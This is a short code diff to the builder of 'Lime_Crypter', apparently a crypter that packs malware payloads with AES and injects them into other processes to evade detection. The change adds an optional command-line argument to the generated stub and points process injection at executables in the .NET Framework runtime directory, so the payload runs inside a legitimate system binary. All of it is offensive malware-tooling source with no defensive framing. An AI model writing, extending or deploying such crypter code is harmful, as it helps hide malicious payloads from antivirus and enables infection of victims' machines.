@@ -43,6 +43,9 @@ namespace Lime_Crypter.Build
         public string PayloadResources { get; set; }
         public string StubLib { get; set; }
         public string AesKey { get; set; }
+        public string CommandLine { get; set; }
+        public bool CommaLineIsChecked { get; set; }
+
         #endregion
 
         public string Compile()
@@ -185,11 +188,18 @@ namespace Lime_Crypter.Build
                 Stub = Stub.Replace("#Injection", InjectionName);
             }
             else
-                Stub = Stub.Replace("#Injection", "\"" + InjectionName + ".exe" + "\"");
+            {
+                Stub = Stub.Replace("#Injection", @"Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace(""Framework64"", ""Framework""), """ + InjectionName + @".exe"")");
+            }
             Stub = Stub.Replace("#AesKey", AesKey);
 
             if (IsInstall)
                 Stub = Stub.Replace("//#define install", "#define install");
+
+            if (CommaLineIsChecked)
+                Stub = Stub.Replace("#cmd", CommandLine);
+            else
+                Stub = Stub.Replace("#cmd", "");
 
             Stub = Stub.Replace("#FileName", FileName + ".exe");
             Stub = Stub.Replace("@FolderName", @"" + FolderName + @"");
